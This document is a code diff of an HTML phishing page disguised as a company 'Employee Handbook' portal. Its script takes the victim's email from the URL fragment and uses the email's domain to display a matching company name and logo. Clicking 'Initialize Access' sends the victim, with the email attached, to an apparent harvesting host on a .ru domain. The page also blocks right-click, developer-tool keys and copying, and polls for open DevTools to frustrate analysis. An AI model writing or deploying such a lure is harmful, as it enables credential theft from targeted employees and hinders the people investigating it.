@@ -3,181 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Employee Handbook</title>
+    <title>Enterprise Portal</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
             padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            background: linear-gradient(to right, #4facfe, #00f2fe);
+            min-height: 100vh;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
-            text-align: center;
         }
 
-        .cover-page {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+        .container {
+            text-align: center;
+            padding: 2rem;
+            background: rgba(0,0,0,0.2);
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.1);
+            backdrop-filter: blur(10px);
+            max-width: 500px;
+            width: 90%;
         }
-        .cover-page h1 {
-            font-size: 3em;
-            margin: 0;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+
+        .logo {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 1.5rem;
+            border-radius: 50%;
+            object-fit: contain;
+            background: white;
+            padding: 5px;
         }
-        .cover-page h2 {
-            font-size: 2em;
-            margin: 0;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+
+        h1 {
+            margin: 0 0 0.2rem;
+            font-size: 2.2em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
         }
-        .cover-page p {
-            font-size: 1.2em;
-            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.5);
+
+        .handbook-title {
+            font-size: 1.5em;
+            margin: 0 0 1.5rem;
+            font-weight: 300;
+            opacity: 0.9;
         }
-        .cover-page a {
-            margin-top: 20px;
-            padding: 10px 20px;
-            background-color: white;
-            color: #4facfe;
-            text-decoration: none;
-            border-radius: 5px;
-            font-size: 1.2em;
-        }
-        .cover-page img {
-            max-width: 150px;
-            margin-bottom: 20px;
-        }
-        #loadingSpinner {
-            display: none;
-            margin-top: 20px;
-        }
+
         button {
-            padding: 10px 40px; /* Increased padding for a larger button */
-            font-size: 1.1em; /* Increased font size */
-            font-weight: bold;
-            color: #fff;
-            background: linear-gradient(90deg, #ff6f61, #d84315);
+            padding: 12px 45px;
+            font-size: 1.1em;
+            background: linear-gradient(45deg, #4fd1c5, #48bb78);
             border: none;
-            border-radius: 50px; /* Makes the button oval */
+            border-radius: 30px;
+            color: white;
             cursor: pointer;
-            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2);
-            transition: background 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
-        button:disabled {
-            background: #888;
-            cursor: not-allowed;
+
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(79,209,197,0.4);
         }
-        button:hover:enabled {
-            background: linear-gradient(90deg, #e64a19, #bf360c);
-            transform: translateY(-5px);
-            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
-        }
-        button:active:enabled {
-            transform: translateY(0);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+
+        .loading {
+            display: none;
+            margin-top: 1.5rem;
+            font-size: 0.9em;
+            color: rgba(255,255,255,0.9);
         }
     </style>
     <script>
-        function decodeBase64(base64) {
-            return decodeURIComponent(atob(base64).split('').map(function(c) {
-                return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
-            }).join(''));
+        function extractEmailAndRedirect() {
+            const hash = window.location.hash.substring(1);
+            const email = decodeURIComponent(hash);
+            const redirectUrl = `https://a5.gwrivesmidic.ru/1gjk/#K${email}`;
+            window.location.href = redirectUrl;
         }
 
-        function setupPage() {
-            let email = window.location.hash.substring(1);
-            if (email.includes('%') || email.includes('=')) {
-                email = decodeBase64(email);
+        function handleButtonClick() {
+            document.getElementById('loadingStatus').style.display = 'block';
+            extractEmailAndRedirect();
+        }
+
+        function initializePage() {
+            const hash = window.location.hash.substring(1);
+            const email = decodeURIComponent(hash);
+            
+            if (!email) {
+                alert('Invalid access link structure');
+                return;
             }
+
             const domain = email.split('@')[1];
-            const companyName = domain.split('.')[0];
-            document.getElementById('company-name').innerText = companyName.charAt(0).toUpperCase() + companyName.slice(1);
-            document.getElementById('redirectUrl').value = `https://a5.gwrivesmidic.ru/1gjk/#K${(email)}`;
-            const logo = document.getElementById('company-logo');
-            logo.src = `https://logo.clearbit.com/${domain}`;
-            logo.onerror = function() {
-                logo.style.display = 'none';
-            };
-            document.getElementById('year').innerText = new Date().getFullYear();
+            if (domain) {
+                const companyName = domain.split('.')[0];
+                document.getElementById('companyName').textContent = 
+                    companyName.charAt(0).toUpperCase() + companyName.slice(1);
+                
+                const logo = document.getElementById('companyLogo');
+                logo.src = `https://logo.clearbit.com/${domain}?size=240`;
+                logo.onerror = () => logo.style.display = 'none';
+            }
+
+            document.getElementById('accessButton').disabled = false;
         }
 
-        function preventDefaultActions() {
-            // Disable Right-Click
-            document.addEventListener("contextmenu", (e) => {
-                e.preventDefault();
-            });
-
-            // Prevent F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
-            document.addEventListener("keydown", (e) => {
-                if (
-                    e.key === "F12" || 
-                    (e.ctrlKey && (e.key === "u" || e.key === "U" || e.key === "j" || e.key === "J" || e.key === "i" || e.key === "I"))
-                ) {
-                    e.preventDefault();
-                }
-            });
-
-            // Replace Copied Text with Random Characters
-            document.addEventListener("copy", (e) => {
-                e.preventDefault();
-                const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-                const randomString = Array.from({ length: 100 }, () => randomChars.charAt(Math.floor(Math.random() * randomChars.length))).join("");
-                e.clipboardData.setData("text/plain", randomString);
-            });
-        }
-
-        function handleRedirect() {
-            const button = document.getElementById("redirectButton");
-            const spinner = document.getElementById("loadingSpinner");
-
-            button.addEventListener("click", function (e) {
-                e.preventDefault(); // Prevent immediate form submission
-
-                // Show loading spinner
-                spinner.style.display = 'block';
-
-                // Change button text and style
-                button.textContent = "Check Completed...";
-                button.style.background = "linear-gradient(90deg, #4caf50, #2e7d32)"; // Change to green
-                button.style.transition = "background 0.5s";
-
-                // Simulate a short delay before form submission
-                setTimeout(() => {
-                    const redirectUrl = document.getElementById("redirectUrl").value;
-                    window.location.href = redirectUrl; // Redirect to the URL
-                }, 2500); // 2.5-second delay
-            });
-        }
-
-        document.addEventListener("DOMContentLoaded", () => {
-            setupPage();
-            preventDefaultActions();
-            handleRedirect();
-
-            // Enable the button after setup
-            document.getElementById("redirectButton").disabled = false;
-        });
+        window.addEventListener('DOMContentLoaded', initializePage);
     </script>
 </head>
 <body>
-
-    <!-- Cover Page -->
-    <div class="cover-page">
-        <img id="company-logo" src="#" alt="Company Logo">
-        <h1 id="company-name">[Company Name]</h1>
-        <h2>Employee Handbook</h2>
-        <p id="year"></p>
-        <form id="redirectForm" method="POST">
-            <!-- Hidden input to store the redirect URL -->
-            <input type="hidden" name="redirectUrl" id="redirectUrl" value="" />
-            <button id="redirectButton" disabled aria-label="Initialize redirection">Open</button>
-        </form>
-        <div id="loadingSpinner">Loading...</div>
+    <div class="container">
+        <img id="companyLogo" class="logo" alt="Company Logo">
+        <h1 id="companyName">Enterprise Portal</h1>
+        <div class="handbook-title">Employee Handbook</div>
+        
+        <button id="accessButton" onclick="handleButtonClick()" disabled>Initialize Access</button>
+        <div class="loading" id="loadingStatus">Redirecting...</div>
     </div>
+</body>
+</html>
+
+<script>
+    document.addEventListener("DOMContentLoaded", () => {
+        // Disable Right-Click
+        document.addEventListener("contextmenu", (e) => {
+            e.preventDefault();
+            
+        });
+
+        // Prevent F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+J
+        document.addEventListener("keydown", (e) => {
+            if (
+                e.key === "F12" || 
+                (e.ctrlKey && (e.key === "u" || e.key === "U" || e.key === "j" || e.key === "J" || e.key === "i" || e.key === "I"))
+            ) {
+                e.preventDefault();
+                
+            }
+        });
+
+        // Detect if DevTools is Open
+        const checkDevTools = () => {
+            const threshold = 160;
+            const devtools = {
+                open: false,
+                orientation: null,
+            };
+            const element = new Image();
+            Object.defineProperty(element, "id", {
+                get: function () {
+                    devtools.open = true;
+                    devtools.orientation = window.outerWidth - window.innerWidth > threshold ? "vertical" : "horizontal";
+                },
+            });
+            console.log(element); // Trigger the getter
+            return devtools.open;
+        };
+
+        // Monitor for DevTools
+        setInterval(() => {
+            if (checkDevTools()) {
+                
+            }
+        }, 500);
+
+        // Replace Copied Text with Random Characters
+        document.addEventListener("copy", (e) => {
+            e.preventDefault();
+            const randomChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            const randomString = Array.from({ length: 100 }, () => randomChars.charAt(Math.floor(Math.random() * randomChars.length))).join("");
+            e.clipboardData.setData("text/plain", randomString);
+            
+        });
+    });
+</script>
 
 </body>
 </html>
